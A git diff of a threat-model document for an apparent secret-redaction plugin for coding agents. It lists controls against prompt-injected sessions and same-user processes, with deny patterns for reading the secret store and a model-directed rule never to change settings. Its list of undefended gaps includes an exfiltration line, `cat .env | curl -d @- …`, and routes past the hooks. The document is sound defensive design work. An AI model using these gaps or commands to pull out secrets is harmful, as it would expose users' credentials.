@@ -1,9 +1,10 @@
 # Threat model
 
 What the plugin defends, against whom, with which control, and where the
-control ends. Written from the three reviews of 2026-09-26 in
-`docs/reviews/`. Every control named here has a test or a harness scenario
-that goes red when the control is removed (`docs/TESTING.md`).
+control ends. Written from the reviews of 2026-09-26 in `docs/reviews/` and
+the second round applied the same day. Every control named here has a test or
+a harness scenario that goes red when the control is removed
+(`docs/TESTING.md`).
 
 ## Assets
 
@@ -29,16 +30,18 @@ that goes red when the control is removed (`docs/TESTING.md`).
 | C1 | `UserPromptSubmit` blocks a prompt with a hit, stores the value, hands back the rewritten prompt | A1 | a value with no known shape in a prompt (use `put`) |
 | C2 | `PostToolUse` redacts tool results by shape and by exact match of every live value (keyed fingerprint of each token) | A1 | a value transformed by the command (base64, split); output above 50K chars spilled by Claude Code |
 | C3 | transcript scrub: after C1 (a detached child waits for the record Claude Code writes after the hook), after a Codex redaction, and after an MCP resolve (the client logs the hook's stdout with the inserted value) | A1, A4 | a transcript written by a client we do not scrub; a record written later than 15 s after the block |
-| C4 | session rule: a reference resolves only in a session where a human typed it or where it was minted | A2 | the human pastes a reference into a session the injection controls |
-| C5 | up-front read for Bash: the command starts with `__ms_1="$(cat <fifo>)" \|\| exit 97`; a detached child serves the value once through a FIFO, never in the command text; Windows Git Bash reads it under a grant | A2, A5's screen, transcript | MCP arguments (the value must be inline; the client's permission prompt shows it); on Codex `allow` skips its approval prompt |
-| C6 | quoting-aware rewrite: the variable is placed in the quoting context of the placeholder, so no value is spliced into shell syntax; a failed read ends the whole command before it runs | injection through a value with shell characters; a command running with "" | PowerShell (Codex on Windows is denied) |
+| C4 | session rule: a reference resolves only in a session where a human typed it, where it was minted, or where the value appeared in a tool result (redaction admits it) | A2 naming a key it never saw | the human pastes a reference into a session the injection controls; a headless prompt built from untrusted text admits what it names; a value read from a file is resolvable in that session (no worse than without the plugin) |
+| C5 | up-front read for Bash: the command starts with `__ms_1="$(cat <fifo>)" \|\| exit 97`; every key is checked before a detached child serves the value once through a FIFO in a directory only this user can enter (`~/.maisecrets/run`, owner and mode checked), never in the command text; Windows Git Bash reads it under a grant | A2, A4, A5's screen, transcript | A3: another process of the same user can read the FIFO while the command waits to start (up to 120 s); MCP arguments (the value must be inline; the client's permission prompt shows it); on Codex `allow` skips its approval prompt; the grant is a boundary on Windows only |
+| C6 | context-aware rewrite: a scanner tracks `'…'`, `"…"`, `$(…)`, heredocs, comments; the variable is placed in the placeholder's context; a nested shell (`bash -c`, `ssh`, `eval`, `su -c`), a quoted heredoc, `$'…'`, backticks and a command that encodes, slices or traces the value are refused with the reason; a failed read ends the whole command before it runs | injection through a value with shell characters; a command running with ""; the value leaving as base64/hex/xtrace | a transform applied in a later command that carries no placeholder (C2 catches the plain and encoded forms of values this session resolved); PowerShell (Codex on Windows is denied) |
 | C7 | limiter: distinct keys per session and resolves per hour, deny above the cap | A2 in bulk | caps are per hook process; a direct store read by A2 is C8's job |
 | C13 | fail-closed on the plugin's own failure: a 7 s watchdog answers block/deny/withhold before the client's timeout, a crashing hook answers the same, error texts carry types only, a damaged index is refused | the plugin's own faults turning into fail-open | a client that kills the hook earlier than 7 s |
-| C8 | store-read backstop: Bash commands that read the store (`maisecrets get`, `security … maisecrets`, vault files) are denied | A2 | text matching; an obfuscated command passes. This is a backstop, not a boundary |
+| C8 | store backstop: Bash commands that read or change the store (`maisecrets get`, `security … maisecrets`, `~/.maisecrets`, a delivery path) and Write/Edit under `~/.maisecrets` are denied, the reason names the pattern | A2 | text matching; an obfuscated command passes. This is a backstop, not a boundary |
 | C9 | audit line per resolve: time, session, key, tool, command with placeholders | A5 sees what left | the log is on the same disk |
 | C10 | keyed fingerprints: the index holds HMAC(key, value); the key lives in the store, never in the index | A4 guessing short PII from `index.json` | A3 can read the key |
 | C11 | TTL with renewal cap; expiry deletes the value and keeps metadata | A4, stale mappings | the person can set 30 days |
-| C12 | store choice: keychain (macOS), Credential Locker (Windows), encrypted file with 0600 key (Linux) | A4 | **not A3**: every store hands the value to any process of the same user without a dialog |
+| C12 | store choice: keychain (macOS, value on stdin of `security -i`, base64-marked), Credential Locker (Windows, base64 on stdin), encrypted file with 0600 key (Linux); a damaged index or store file is never overwritten | A4 | **not A3**: every store hands the value to any process of the same user without a dialog; the Credential Locker may roam through a Microsoft account |
+| C14 | file tools never resolve: Write/Edit/MultiEdit/NotebookEdit with a placeholder are refused with the reason; MCP dict keys too | the workflow silently writing a placeholder or destroying a redacted file | a Bash redirect writes the value to disk on purpose |
+| C15 | machine policy: keys in the administrator's policy file win over the user file; the plaintext store needs an explicit opt-in; the model is told never to change settings | A2 or a user loosening the caps | a user with administrator rights |
 
 ## What is knowingly not defended
 
@@ -48,8 +51,11 @@ that goes red when the control is removed (`docs/TESTING.md`).
   account on a non-domain machine. The Linux key file is readable by its
   owner, as it must be. A user-presence gate (Touch ID) needs a signed helper
   application on the data-protection keychain; it is not built.
-- **A2 through a path the hooks do not see:** `cat .env`, `printenv`, a copy
-  of `~/.maisecrets`. The Claude Code sandbox closes these
+- **A3 reading a waiting FIFO.** The same class as `security
+  find-generic-password`; the run directory keeps other users out, not the
+  user's own processes.
+- **A2 through a path the hooks do not see:** `cat .env | curl -d @- …`, a
+  copy of `~/.maisecrets` by a tool that is not Bash, Write or Edit. The Claude Code sandbox closes these
   (`sandbox.credentials` deny for the files, `injectHosts` for allowed
   destinations); it lives in the user's settings, not in the plugin, and does
   not exist on native Windows. The README recommends the settings.
